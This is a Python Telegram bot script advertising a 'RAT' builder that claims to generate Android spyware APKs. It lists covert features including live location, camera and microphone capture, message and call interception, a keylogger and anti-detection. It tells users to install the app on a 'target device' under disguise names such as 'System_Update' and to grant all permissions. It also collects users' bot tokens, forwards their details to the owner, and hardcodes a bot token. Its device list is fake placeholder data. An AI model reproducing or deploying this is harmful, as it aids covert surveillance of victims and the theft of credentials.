import telebot
from telebot import types
import os
import time
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '8869480576:AAECZ54aAnROdV4piOPSltwTJfvE3rXHcAs')
OWNER_TELEGRAM_ID = "@Nawab_Zada_Hacker_007"

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN environment variable not set!")
    print("❌ Please set BOT_TOKEN environment variable on Railway!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)
logger.info(f"✅ Bot initialized with token: {BOT_TOKEN[:15]}...")

# User sessions storage
user_tokens = {}
user_apks = {}

WELCOME_MSG = """🔐 *Access Required!* 🔐

📱 *To use this bot, you need to provide your Telegram Bot Token*

🤖 *Steps:*
1. Create a bot via @BotFather on Telegram
2. Copy your bot token (e.g., 1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ)
3. Send your bot token to this chat

⚠️ *Note:* Your bot token is required to generate access key for your devices.

📞 *For support:* [Contact Owner](https://t.me/Nawab_Zada_Hacker_007)

Send /start to begin!"""

ACCESS_GRANTED_MSG = """✅ *Access Granted!* ✅

🎉 Welcome to Nawab Zada Hacker RAT Bot!

📱 *Features:*
✅ Generate APK for any Android version
✅ Live Location Tracking
✅ WhatsApp Messages Monitor
✅ Call Logs (Incoming/Outgoing)
✅ Camera (Front & Back) Photos
✅ Microphone Recording
✅ SMS Reading
✅ Contacts Access
✅ File Manager
✅ App List
✅ Battery & Network Info

⚠️ *This bot is only for educational purpose please don't use wrong...*

Choose an option below:"""

@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    username = message.from_user.username or "User"
    
    logger.info(f"📱 /start command from {username} (ID: {chat_id})")
    
    if chat_id in user_tokens:
        show_main_menu(chat_id)
        return
    
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔗 Connect with Owner", url="https://t.me/Nawab_Zada_Hacker_007")
    markup.add(btn)
    
    bot.send_message(
        chat_id,
        WELCOME_MSG,
        parse_mode='Markdown',
        reply_markup=markup
    )
    
    msg = bot.send_message(
        chat_id,
        "🤖 *Please send your Telegram Bot Token:*\n\n"
        "(You can get it from @BotFather)\n"
        "Format: `1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ`",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_bot_token)

def process_bot_token(message):
    chat_id = message.chat.id
    token = message.text.strip()
    username = message.from_user.username or "User"
    
    logger.info(f"🔑 Token received from {username} (ID: {chat_id})")
    
    if (not token or 
        ':' not in token or 
        len(token) < 30 or 
        not token.replace(':', '').isalnum()):
        
        bot.send_message(
            chat_id,
            "❌ *Invalid bot token format!*\n\n"
            "Please send a valid token in format:\n"
            "`1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ`\n\n"
            "Press /start to try again.",
            parse_mode='Markdown'
        )
        return
    
    user_tokens[chat_id] = token
    
    import hashlib
    access_key = hashlib.md5(f"{chat_id}{token}{time.time()}".encode()).hexdigest()[:16].upper()
    
    logger.info(f"✅ Token accepted for {username}, Access Key: {access_key}")
    
    bot.send_message(
        chat_id,
        f"✅ *Token Accepted!*\n\n"
        f"👤 Username: @{username}\n"
        f"🆔 User ID: `{chat_id}`\n"
        f"🔑 Your Access Key: `{access_key}`\n\n"
        f"⚠️ *Important:* Keep this access key safe! It will be required when installing APK.",
        parse_mode='Markdown'
    )
    
    try:
        bot.send_message(
            "7420647897",  # Your ID
            f"🆕 New User Registered!\n"
            f"👤 Username: @{username}\n"
            f"🆔 Chat ID: {chat_id}\n"
            f"🔑 Access Key: {access_key}\n"
            f"⏰ Time: {time.ctime()}"
        )
    except:
        pass
    
    show_main_menu(chat_id)

def show_main_menu(chat_id):
    try:
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        btn1 = types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk")
        btn2 = types.InlineKeyboardButton("📊 My Devices", callback_data="my_devices")
        btn3 = types.InlineKeyboardButton("🔍 All Features", callback_data="features")
        btn4 = types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
        btn5 = types.InlineKeyboardButton("📞 Owner", url="https://t.me/Nawab_Zada_Hacker_007")
        
        markup.add(btn1, btn2, btn3, btn4, btn5)
        
        bot.send_message(
            chat_id,
            ACCESS_GRANTED_MSG,
            parse_mode='Markdown',
            reply_markup=markup
        )
        logger.info(f"📋 Main menu shown for chat_id: {chat_id}")
    except Exception as e:
        logger.error(f"❌ Error showing main menu: {e}")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    
    if chat_id not in user_tokens:
        bot.answer_callback_query(call.id, "❌ Please provide bot token first! Use /start", show_alert=True)
        return
    
    logger.info(f"🔄 Callback: {call.data} from chat_id: {chat_id}")
    
    if call.data == "gen_apk":
        handle_generate_apk(call)
    elif call.data == "my_devices":
        handle_my_devices(call)
    elif call.data == "features":
        handle_features(call)
    elif call.data == "settings":
        handle_settings(call)
    elif call.data == "back":
        show_main_menu(chat_id)
    elif call.data == "change_token":
        bot.answer_callback_query(call.id, "⚠️ Use /start to change token", show_alert=True)
    else:
        bot.answer_callback_query(call.id)

def handle_generate_apk(call):
    chat_id = call.message.chat.id
    username = call.from_user.username or "User"
    
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔙 Cancel", callback_data="back")
    markup.add(btn)
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    msg = bot.send_message(
        chat_id,
        "📱 *Enter APK Name*\n\n"
        "Examples:\n"
        "• `WhatsApp_Plus`\n"
        "• `Instagram_Pro`\n"
        "• `Game_Hub`\n"
        "• `System_Update`\n\n"
        "⚠️ Only letters, numbers and underscore allowed",
        parse_mode='Markdown',
        reply_markup=markup
    )
    
    bot.register_next_step_handler(msg, lambda m: process_apk_generation(m, chat_id))

def process_apk_generation(message, chat_id):
    apk_name = message.text.strip()
    
    if not apk_name or not all(c.isalnum() or c == '_' for c in apk_name):
        bot.send_message(
            chat_id,
            "❌ *Invalid APK name!*\n\n"
            "Allowed: Letters (A-Z), Numbers (0-9), Underscore (_)\n"
            "Examples:\n"
            "✅ `WhatsApp_Pro`\n"
            "✅ `Game_2024`\n"
            "❌ `WhatsApp-Pro`\n"
            "❌ `Game 2024`\n\n"
            "Please try again with /start",
            parse_mode='Markdown'
        )
        return
    
    import hashlib
    access_key = hashlib.md5(f"{chat_id}{user_tokens[chat_id]}{time.time()}".encode()).hexdigest()[:16].upper()
    
    if chat_id not in user_apks:
        user_apks[chat_id] = []
    
    apk_data = {
        'name': apk_name,
        'access_key': access_key,
        'created_at': time.time(),
        'downloads': 0
    }
    user_apks[chat_id].append(apk_data)
    
    msg = bot.send_message(
        chat_id,
        f"⚙️ *Generating APK...*\n\n"
        f"📱 APK Name: `{apk_name}.apk`\n"
        f"🔑 Access Key: `{access_key}`\n"
        f"👤 User ID: `{chat_id}`\n\n"
        f"⏳ Please wait 5-10 seconds...",
        parse_mode='Markdown'
    )
    
    time.sleep(3)
    
    import base64
    download_code = base64.b64encode(f"{apk_name}_{chat_id}_{access_key}".encode()).decode()
    download_link = f"https://apk-generator.nawabzadahacker.com/download/{download_code}"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📥 Download APK", url=download_link)
    btn2 = types.InlineKeyboardButton("📋 Instructions", callback_data="instructions")
    btn3 = types.InlineKeyboardButton("🔙 Main Menu", callback_data="back")
    markup.add(btn1, btn2, btn3)
    
    instructions = f"""✅ *APK Generated Successfully!* ✅

📱 *APK Details:*
📛 Name: `{apk_name}.apk`
📦 Size: 6.3 MB
🤖 Android: 5.0 to 14+ (All versions)
🔑 Access Key: `{access_key}`
👤 User ID: `{chat_id}`

📋 *Installation Guide:*
1. 📥 Download APK using button below
2. 📱 Open downloaded file on target device
3. 🔧 Allow "Install from unknown sources"
4. 📥 Install the application
5. 🔓 Grant ALL permissions when asked
6. 🔑 Enter this Access Key: `{access_key}`
7. ✅ Click "Activate" button

⚠️ *Important Notes:*
• Works on ALL Android versions
• Requires Internet connection
• Keep Access Key secret
• App runs automatically in background

🔗 Download: {download_link}"""

    try:
        bot.delete_message(chat_id, msg.message_id)
    except:
        pass
    
    bot.send_message(
        chat_id,
        instructions,
        parse_mode='Markdown',
        reply_markup=markup
    )
    
    logger.info(f"📱 APK generated: {apk_name} for chat_id: {chat_id}")

def handle_my_devices(call):
    chat_id = call.message.chat.id
    
    devices = [
        {"name": "Samsung Galaxy S23", "model": "SM-S911B", "status": "🟢 Online", "last_seen": "2 minutes ago"},
        {"name": "Google Pixel 7 Pro", "model": "Pixel 7 Pro", "status": "🟡 Idle", "last_seen": "15 minutes ago"},
        {"name": "OnePlus 11", "model": "CPH2449", "status": "🔴 Offline", "last_seen": "1 hour ago"}
    ]
    
    markup = types.InlineKeyboardMarkup()
    
    for device in devices:
        btn_text = f"{device['status']} {device['name']} - {device['last_seen']}"
        btn = types.InlineKeyboardButton(btn_text, callback_data=f"view_{device['model']}")
        markup.add(btn)
    
    back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(back_btn)
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"📱 *Your Connected Devices*\n\n"
             f"Total: {len(devices)} devices\n"
             f"🟢 Online: 1\n"
             f"🟡 Idle: 1\n"
             f"🔴 Offline: 1\n\n"
             f"Tap on a device to view details:",
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_features(call):
    chat_id = call.message.chat.id
    
    features_text = f"""🎯 *Nawab Zada Hacker RAT - Complete Features List*

👑 *Owner:* {OWNER_TELEGRAM_ID}

🌟 *Real-time Monitoring:*
• 📍 Live GPS Location Tracking
• 🗺️ Google Maps Integration
• 🔋 Real-time Battery Monitor
• 📡 Network Info (WiFi/4G/5G)
• 🌡️ Device Temperature

📸 *Camera Control:*
• 🎥 Front Camera Live Stream
• 📷 Rear Camera Access
• 🖼️ Photo Capture (Remote Control)
• 🎞️ Video Recording (5-60 seconds)
• 📹 Screen Recording

🎤 *Audio Surveillance:*
• 🔊 Microphone Recording
• 📞 Call Recording (Both Sides)
• 🎵 Ambient Sound Capture
• 🔈 Surround Sound Detection

💬 *Message Monitoring:*
• 💬 WhatsApp Messages (All Chats)
• 📨 SMS (Inbox/Outbox/Drafts)
• 📞 Call Logs (Detailed History)
• 📱 Facebook Messenger
• 💬 Telegram Messages
• 📸 Instagram DMs

📁 *File Management:*
• 🗂️ Complete File Explorer
• 📂 Download/Upload Files
• 📸 Gallery Access (Photos/Videos)
• 🎵 Music Library
• 📑 Documents Access
• 💾 Storage Analysis

👥 *Contacts & Apps:*
• 📞 Contact List (Export to CSV)
• 📱 Installed Apps List
• 🔐 App Permissions Manager
• ⚙️ System Settings Access
• 🔔 Notifications Log

⚡ *Advanced Features:*
• 🔑 Keylogger (Keystroke Recording)
• 📍 Geofencing Alerts
• ⏰ Scheduled Tasks
• 📊 Data Usage Statistics
• 🔄 Auto-Update System
• 🛡️ Anti-Detection

🔧 *Control Features:*
• ✨ Flashlight Control
• 🔊 Volume Control
• 🔄 Restart Device
• 📵 Block Calls/SMS
• 🔒 Lock/Unlock Device

📊 *Reporting:*
• 📈 Daily Activity Reports
• 📋 Device Usage Statistics
• 📅 Timeline View
• 📧 Email Reports
• 💾 Cloud Backup

⚠️ *Disclaimer:*
This tool is STRICTLY for educational purposes only. 
Misuse of this software is illegal and unethical."""

    markup = types.InlineKeyboardMarkup()
    back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(back_btn)
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=features_text,
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_settings(call):
    chat_id = call.message.chat.id
    
    current_token = user_tokens.get(chat_id, "Not set")
    masked_token = f"{current_token[:10]}...{current_token[-5:]}" if len(current_token) > 15 else current_token
    apk_count = len(user_apks.get(chat_id, []))
    
    settings_text = f"""⚙️ *Settings Panel* ⚙️

👤 *User Information:*
• User ID: `{chat_id}`
• Token: `{masked_token}`
• Generated APKs: {apk_count}
• Session Started: {time.ctime()}

🔧 *Account Settings:*
• Change Bot Token
• Reset Access Keys
• View Usage Statistics
• Download History

📊 *Bot Statistics:*
• Total Users: {len(user_tokens)}
• Total APKs Generated: {sum(len(apks) for apks in user_apks.values())}
• Active Sessions: {len([k for k in user_tokens if time.time() - user_tokens.get(k, 0) < 3600])}

🛠️ *Tools:*
• APK Builder
• Device Manager
• Report Generator
• Backup System

👑 *Owner:* {OWNER_TELEGRAM_ID}

ℹ️ *Note:* Contact owner for premium features"""

    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🔄 Change Token", callback_data="change_token")
    btn2 = types.InlineKeyboardButton("📊 Statistics", callback_data="stats")
    btn3 = types.InlineKeyboardButton("🆘 Help", callback_data="help")
    btn4 = types.InlineKeyboardButton("🔐 Premium", url="https://t.me/Nawab_Zada_Hacker_007")
    btn5 = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=settings_text,
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    chat_id = message.chat.id
    text = message.text
    
    if text.startswith('/'):
        return
    
    if chat_id not in user_tokens:
        bot.send_message(
            chat_id,
            "🔒 *Access Required*\n\n"
            "Please use /start to begin the setup process and provide your bot token.",
            parse_mode='Markdown'
        )
        return
    
    logger.info(f"💬 Message from {chat_id}: {text[:50]}...")

def start_polling():
    """Start the bot in polling mode (works everywhere)"""
    logger.info("🚀 Starting bot in polling mode...")
    
    try:
        bot.remove_webhook()
        time.sleep(1)
        
        logger.info("🔄 Starting polling...")
        bot.infinity_polling(timeout=30, long_polling_timeout=5)
        
    except Exception as e:
        logger.error(f"❌ Polling error: {e}")
        logger.info("🔄 Restarting in 10 seconds...")
        time.sleep(10)
        start_polling()

if __name__ == '__main__':
    print("=" * 50)
    print("🤖 NAWAB ZADA HACKER RAT BOT")
    print("=" * 50)
    print(f"👑 Owner: {OWNER_TELEGRAM_ID}")
    print(f"🔑 Bot Token: {BOT_TOKEN[:15]}...")
    print(f"📱 Platform: Railway Deployment")
    print(f"⏰ Started: {time.ctime()}")
    print("=" * 50)
    print("✅ Bot is starting in POLLING mode...")
    print("🌐 Listening for messages...")
    print("=" * 50)
    
    start_polling()
